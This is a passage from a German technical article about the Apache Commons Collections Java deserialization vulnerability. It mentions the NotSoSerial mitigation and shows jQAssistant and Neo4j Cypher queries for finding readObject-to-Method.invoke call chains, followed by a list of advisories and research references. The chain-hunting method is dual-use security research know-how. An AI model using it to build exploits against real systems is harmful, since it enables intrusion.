<p>Einen sinnvollen Ansatz stellt der quelloffene Java Agent "NotSoSerial" von Eirik Bjørsnøs dar, der den Deserialisierungsvorgang kontrolliert und neben Blacklisting der bekannten, problematischen Klassen, ein Whitelisting und eine Protokollierung von deserialisierten Klassen erlaubt.</p>
</div>
<div class="paragraph">
<p>Da der Angriff jetzt jetzt erst einmal weit bekannt ist, sollte es nicht zu schwer sein, ähnliche Kombinationen mit anderen häufig genutzten Bibliotheken und Tools zu finden.
Wir können uns also auf weitere, ähnliche Lücken freuen. Im schlimmsten Fall werden dass Varianten sein, die direkt in den Standardklassen von Java vorliegen.</p>
</div>
<div class="paragraph">
<p>Interessanterweise ist es gar nicht so schwierig, solche Lücken aufzuspüren, wenn die zugrundeliegende Schadenskombination erst einmal bekannt ist.
Ich möchte zum Abschluss einmal darstellen, wie man selbst mit open-source Hilfsmittel zu denselben Erkenntnissen kommen kann, wie die Sicherheitsforscher wie Chris Frohoff &amp; Co.</p>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_nadel_im_heuhaufen">Nadel im Heuhaufen</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Softwareanalyse mit Graphdatenbanken ist eines meiner Lieblingsthemen.
Mit dem quelloffenen Framework jQAssistant ist es schnell möglich vorliegende Java-Anwendungen und Bibliotheken zu scannen.
Die ermittelten Informationen werden in der Graphdatenbank Neo4j als vernetzte Strukturen aus Klassen, Methoden, Interfaces, Paketen, Felder usw. abgelegt die eine Vielzahl von Beziehungen (Vererbung, Deklaration, Benutzung, Aufruf usw.) zu einander haben.</p>
</div>
<div class="paragraph">
<p>jQAssistant selbst kommt mit einer Menge von Plugins für das Scannen verschiedenster Quellinformationen, aber auch einer Reihe von Konzepten für die Anreicherung der Rohdaten mit abgeleiteten fachlichen und technischen Markern und Beziehungen.
Desweiteren stellt es noch Reports für Softwarequalität und Metriken bereit.
Durch die Definition von eigenen Regeln ist es möglich, Softwarearchitektur und andere Qualitätseigenschaften unserer Softwareprojekte abzusichern.
All diese Bestandteile sind frei definierbar und leicht selbst zu schreiben, da sie auf Neo4j&#8217;s Abfragesprache Cypher basieren.</p>
</div>
<div class="paragraph">
<p>Nach dem Download von jQAssistant scannen wir die relevanten Bibliotheken, in unserem Fall <code>rt.jar</code> vom JDK und <code>apache-commons-collections4.jar</code>, mittels: <code>bin/jqassistant.sh scan -f `lib/*.jar</code>.</p>
</div>
<div class="paragraph">
<p>Danach wenden wir zwei Konzepte an, zum Zusammenführen der Klassen aus verschiedenen Jars und zur Verknüpfung von überschriebenen Methoden, mittels einer <code>OVERRIDES</code> Beziehung:
<code>bin/jqassistant.sh analyze -concepts classpath:Resolve,java:MethodOverrides</code></p>
</div>
<div class="openblock">
<div class="content">
<div class="paragraph">
<p>Das zweite Konzept macht in Kurzform diese Operation: Methoden die mit demselben Namen von Superklassen oder Interfaces überschrieben wurde, werden mit einer <code>OVERRIDEN_BY</code> Beziehung verknüpft.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="cypher language-cypher">match (t:Type) where t.fqn =~ "org.apache.commons.collection.*"
match (m:Method)&lt;-[:DECLARES]-(t:Type)-[:EXTENDS|IMPLEMENTS]-&gt;(t0)-[:DECLARES]-&gt;(m0)
where m.name = m0.name
merge (m)&lt;-[:OVERRIDEN_BY]-(m0)
return count(*);</code></pre>
</div>
</div>
</div>
</div>
<div class="paragraph">
<p>Damit haben wir alle notwendigen Werkzeuge in der Hand, um kritische Aufrufketten auf der Basis folgender Grundannahme zu finden:</p>
</div>
<div class="openblock">
<div class="content">
<div class="paragraph">
<p>Während der Deserialisierung eines serialisierbaren Objektes werden in dessen <code>readObject</code> Methode transitive Aufrufe auf den deserialisierten Daten ausgeführt, die schlussendlich bei <code>Method.invoke()</code> ankommen.</p>
</div>
</div>
</div>
<div class="paragraph">
<p>Mittels Neo4j&#8217;s Abfragesprache Cypher können wir die beiden notwendigen Muster für die Enden der Kette abbilden.</p>
</div>
<div class="paragraph">
<p>Wir können diese direkt in der Neo4j Oberfläche ausführen, die man nach Aufruf von <code>bin/jqassistant.sh server</code> auf <code>localhost:7474</code> nutzen kann.</p>
</div>
<div class="paragraph">
<p>Klassen, die transitiv <code>Serializable</code> implementieren, und eine <code>readObject</code> Methode enthalten: (393 Klassen)</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="cypher language-cypher">MATCH (:Interface {fqn:"java.io.Serializable"})&lt;-[:EXTENDS*]-(class),
      (class)-[:DECLARES]-&gt;(m:Method {name:"readObject"})
RETURN count(*);</code></pre>
</div>
</div>
<div class="paragraph">
<p>Aufruf der Methode <code>Method.invoke</code>: (258 Aufrufe)</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="cypher language-cypher">MATCH (:Class {fqn:"java.lang.reflect.Method"})-[:DECLARES]-&gt;(m:Method {name:"invoke"})
RETURN size(()-[:INVOKES]-&gt;(m)) as invocations;</code></pre>
</div>
</div>
<div class="paragraph">
<p>Jetzt müssen wir nur noch den transitiven Aufruf darstellen, der von <code>readObject</code> zu <code>invoke</code> über viele Schritte erfolgen kann:</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="highlight"><code class="cypher language-cypher">MATCH (:Interface {fqn:"java.io.Serializable"})&lt;-[:EXTENDS*]-&gt;(serialized:Class)-[:DECLARES]-&gt;(readObject:Method {name:"readObject"})
MATCH (:Class {fqn:"java.lang.reflect.Method"})-[:DECLARES]-&gt;(invoke:Method {name:"invoke"})

MATCH path = shortestPath((readObject)-[:INVOKES|:OVERRIDES*]-&gt;(invoke))

RETURN serialized,path
ORDER BY length(path) ASC LIMIT 10;</code></pre>
</div>
</div>
<div class="paragraph">
<p>Hier kann man einen der vielen Pfade sehen, die potentiell eine Gefährdung darstellen,
den betroffenen Quellcode muss man sich noch einmal im Detail anschauen.</p>
</div>
<div class="imageblock">
<div class="content">
<img src="jqassistant_deserialize_vulnerability_example1.jpg" alt="jqassistant deserialize vulnerability example1">
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_referenzen">Referenzen</h2>
<div class="sectionbody">
<div class="ulist">
<ul>
<li>
<p>JavaSpektrum GitHub Michael Hunger: <a href="https://github.com/jexp/javaspektrum/blob/master/deserialization_vulnerability" class="bare">https://github.com/jexp/javaspektrum/blob/master/deserialization_vulnerability</a></p>
</li>
<li>
<p>Tool jQAssistant: <a href="http://jqassistant.org/get-started/" class="bare">http://jqassistant.org/get-started/</a></p>
</li>
<li>
<p>Vortrag von Chris Frohoff und Gabriel Lawrence bei AppSecCali2015:</p>
<div class="ulist">
<ul>
<li>
<p>Überblick <a href="http://frohoff.github.io/appseccali-marshalling-pickles/" class="bare">http://frohoff.github.io/appseccali-marshalling-pickles/</a></p>
</li>
<li>
<p>Slides <a href="http://de.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles" class="bare">http://de.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles</a></p>
</li>
<li>
<p>Tool ysoserial: <a href="https://github.com/frohoff/ysoserial" class="bare">https://github.com/frohoff/ysoserial</a></p>
</li>
</ul>
</div>
</li>
<li>
<p>Artikel Pierre Ernst, IBM developerworks, 2013:</p>
<div class="ulist">
<ul>
<li>
<p><a href="http://www.ibm.com/developerworks/library/se-lookahead/" class="bare">http://www.ibm.com/developerworks/library/se-lookahead/</a></p>
</li>
</ul>
</div>
</li>
<li>
<p>Vortrag von Matthias Kaiser,</p>
<div class="ulist">
<ul>
<li>
<p>Slides: <a href="http://de.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478" class="bare">http://de.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478</a></p>
</li>
<li>
<p>Video: <a href="https://www.youtube.com/watch?v=VviY3O-euVQ" class="bare">https://www.youtube.com/watch?v=VviY3O-euVQ</a></p>
</li>
</ul>
</div>
</li>
<li>
<p>Steve Breen: Apache Commons Vulnerability, Nov 6, 2015:</p>
<div class="ulist">
<ul>
<li>
<p><a href="http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/" class="bare">http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</a></p>
</li>
</ul>
</div>
</li>
<li>
<p>Benedikt Ritter, CodeCentric: Hintergründe zum Geschehen:</p>
<div class="ulist">
<ul>
<li>
<p><a href="https://blog.codecentric.de/en/2015/11/comment-on-the-so-called-security-vulnerability-in-apache-commons-collections/" class="bare">https://blog.codecentric.de/en/2015/11/comment-on-the-so-called-security-vulnerability-in-apache-commons-collections/</a></p>
</li>
</ul>
</div>
</li>
<li>
<p>Statement Apache Foundation:</p>
<div class="ulist">
<ul>
<li>
<p><a href="https://blogs.apache.org/foundation/entry/apache_commons_statement_to_widespread" class="bare">https://blogs.apache.org/foundation/entry/apache_commons_statement_to_widespread</a></p>
</li>
</ul>
</div>
</li>
<li>
<p>Detaillierter InfoQ Artikel:</p>
<div class="ulist">
<ul>
<li>
<p><a href="http://www.infoq.com/news/2015/11/commons-exploit" class="bare">http://www.infoq.com/news/2015/11/commons-exploit</a></p>
</li>
</ul>
</div>
</li>
<li>
<p>Java-Agent "NotSoSerial" zur Beschränkung zu deserialiserender Klassen - Eirik Bjørsnøs:</p>
<div class="ulist">
<ul>
<li>
<p><a href="https://github.com/kantega/notsoserial" class="bare">https://github.com/kantega/notsoserial</a></p>
</li>
</ul>
</div>
</li>
<li>
<p>Apache Commons Collections</p>
<div class="ulist">
<ul>
<li>
<p>JIRA issue: <a href="https://issues.apache.org/jira/browse/COLLECTIONS-580" class="bare">https://issues.apache.org/jira/browse/COLLECTIONS-580</a></p>
</li>
</ul>
</div>
</li>
<li>
<p>US-Cert Vulnerability Notice:</p>
<div class="ulist">
<ul>
<li>
<p><a href="http://www.kb.cert.org/vuls/id/576313" class="bare">http://www.kb.cert.org/vuls/id/576313</a> Nov 13</p>
</li>
</ul>
</div>
</li>
<li>
<p>Spring Tracker:</p>
<div class="ulist">
<ul>
<li>
<p><a href="https://jira.spring.io/browse/SPR-13656" class="bare">https://jira.spring.io/browse/SPR-13656</a></p>
</li>
</ul>
</div>
</li>
<li>
<p>Oracle Security Notice:</p>
<div class="ulist">
<ul>
<li>
<p><a href="http://www.oracle.com/technetwork/topics/security/alert-cve-2015-4852-2763333.html" class="bare">http://www.oracle.com/technetwork/topics/security/alert-cve-2015-4852-2763333.html</a></p>
</li>
</ul>
</div>
</li>
<li>
<p>IBM Security Notice:</p>
<div class="ulist">
<ul>
<li>
<p><a href="http://www-01.ibm.com/support/docview.wss?uid=swg21970575" class="bare">http://www-01.ibm.com/support/docview.wss?uid=swg21970575</a></p>
</li>
</ul>
</div>
</li>
<li>
<p>RedHat Tracker:</p>
<div class="ulist">
<ul>
<li>
<p><a href="https://access.redhat.com/solutions/2045023" class="bare">https://access.redhat.com/solutions/2045023</a></p>
</li>
</ul>
</div>
</li>
<li>
<p>Jenkins Bugfix:</p>
<div class="ulist">
<ul>
<li>
<p><a href="https://jenkins-ci.org/content/mitigating-unauthenticated-remote-code-execution-0-day-jenkins-cli" class="bare">https://jenkins-ci.org/content/mitigating-unauthenticated-remote-code-execution-0-day-jenkins-cli</a></p>
</li>
</ul>
</div>
</li>
<li>
<p>Issue in Groovy 2.4.3:</p>
<div class="ulist">
<ul>
<li>
<p><a href="https://srcclr.com/catalog/vulnerabilities/1710" class="bare">https://srcclr.com/catalog/vulnerabilities/1710</a></p>
</li>
</ul>
</div>
</li>
</ul>
</div>
</div>
</div>

</div>


  <div id='wikifoot' class="footnav">
    <div style="text-align:right; float:right" class='lastmod'>Last updated 2015-12-16 21:57:13 CET</div>
	
      <div style="text-align:center;">
      <a href='http://jexp.de/impressum'>Impressum</a>
    - <a class='urllink' href='http://twitter.com/mesirii'>Twitter</a>
	- <a class='urllink' href='http://github.com/jexp'>GitHub</a>
	- <a class='urllink' href='http://stackoverflow.com/users/story/728812'>StackOverflow</a>
	- <a class='urllink' href='http://linkedin.com/jexpde'>LinkedIn</a>
	
   </div>

</body>
</html>